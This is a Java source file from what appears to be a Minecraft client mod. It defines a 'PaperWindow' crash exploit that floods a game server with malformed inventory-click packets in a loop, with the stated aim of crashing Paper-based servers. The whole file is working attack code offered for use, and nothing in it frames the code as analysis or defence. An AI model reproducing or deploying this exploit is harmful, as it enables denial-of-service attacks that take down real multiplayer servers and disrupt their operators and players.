package io.github.spigotrce.paradiseclientfabric.exploit.impl;

import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.exploit.Exploit;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import net.minecraft.client.MinecraftClient;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.slot.SlotActionType;

/**
 * This class represents a specific type of exploit that crashes the game by exploiting a PaperWindow bug.
 * It extends the abstract Exploit class and overrides the execute method to perform the exploit.
 *
 * @author SpigotRCE
 * @since 2.5
 */
@SuppressWarnings("BusyWait")
public class PaperWindowExploit extends Exploit {

    /**
     * Constructs a new PaperWindowExploit object with the given name and description.
     */
    public PaperWindowExploit(MinecraftClient minecraftClient) {
        super("paperwindow", "PaperWindow crash exploit", minecraftClient);
    }

    /**
     * Executes the PaperWindow crash exploit.
     * This method starts a new thread that continuously sends ClickSlotC2SPackets to the server,
     * causing the game to crash due to the PaperWindow exploit.
     */
    @Override
    public void execute() {
        new Thread(() ->
        {
            Helper.printChatMessage("[CrashExploit] [PaperWindow] Crashing...");
            try {
                Int2ObjectArrayMap<ItemStack> itemMap = new Int2ObjectArrayMap<>();
                itemMap.put(0, new ItemStack(Items.ACACIA_BOAT, 1));

                while (isRunning()) {
                    for (int i = 0; i < 12; i++)
                        Helper.sendPacket(new ClickSlotC2SPacket(getMinecraftClient().player.currentScreenHandler.syncId,
                                getMinecraftClient().player.currentScreenHandler.getRevision(),
                                36, -1,
                                SlotActionType.SWAP,
                                getMinecraftClient().player.currentScreenHandler.getCursorStack().copy(),
                                itemMap
                        ));

                    try {
                        Thread.sleep(50);
                    } catch (InterruptedException e) {
                        Helper.printChatMessage("[CrashExploit] [PaperWindow] Unable to sleep 50ms");
                    }
                }
            } catch (NullPointerException ignored) {
            }

        }).start();
    }
}
